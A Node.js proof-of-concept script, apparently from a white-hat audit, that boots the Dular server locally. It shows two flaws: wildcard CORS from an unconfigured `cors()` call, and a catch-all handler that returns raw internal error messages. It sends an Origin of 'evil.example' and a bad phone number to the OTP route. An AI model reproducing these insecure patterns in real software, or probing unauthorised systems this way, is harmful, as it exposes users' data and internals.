// ckb-whitehat PoC — Dular: F7 wildcard CORS + internal error-message leak
//
// index.js line 60: `app.use(cors())` with NO options -> every response to an
// Origin'd request carries Access-Control-Allow-Origin: *. index.js global
// catch-all (line 2358): `res.status(400).json({ error: error.message })`
// returns the raw internal error string to any client.
//
// PoC: boot the real app; send an Origin'd request and read back the CORS
// header; POST a route whose domain error reaches the catch-all and show the
// internal message in the 400 body.

process.env.DATABASE_URL = 'postgres://dular@127.0.0.1:5433/dular'

const main = async () => {
  line('F7 — wildcard CORS + global 400 handler leaking error.message')
  const { default: app } = await import((process.env.DULAR_DIR || '/tmp/ckb-whitehat/dular/server') + '/index.js')
  const http = await import('node:http')
  const server = http.createServer(app)
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const base = `http://127.0.0.1:${server.address().port}`

  const corsRes = await fetch(base + '/api/health', { headers: { Origin: 'https://evil.example' } })
  const acao = corsRes.headers.get('access-control-allow-origin')
  console.log('GET /api/health with Origin: evil.example -> ACAO =', JSON.stringify(acao))

  const errRes = await fetch(base + '/api/auth/request-otp', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: 'garbage' }),
  })
  const errBody = await errRes.json().catch(() => null)
  console.log(`POST /api/auth/request-otp (bad phone) -> HTTP ${errRes.status} body = ${JSON.stringify(errBody)}`)

  const fired = acao === '*' && !!errBody?.error && /valid Kenyan phone|must be|failed/i.test(errBody.error)
  console.log(fired
    ? 'F7 FIRED: any origin may read responses, and raw internal error strings reach unauthenticated clients'
    : 'inspect headers above')

  server.close()
  const { pool } = await import((process.env.DULAR_DIR || '/tmp/ckb-whitehat/dular/server') + '/db.js')
  await pool.end()
  process.exit(fired ? 0 : 1)
}

function line(t) { console.log('\n=== ' + t + ' ===') }
main().catch((e) => { console.error('F7 PoC error:', e); process.exit(2) })
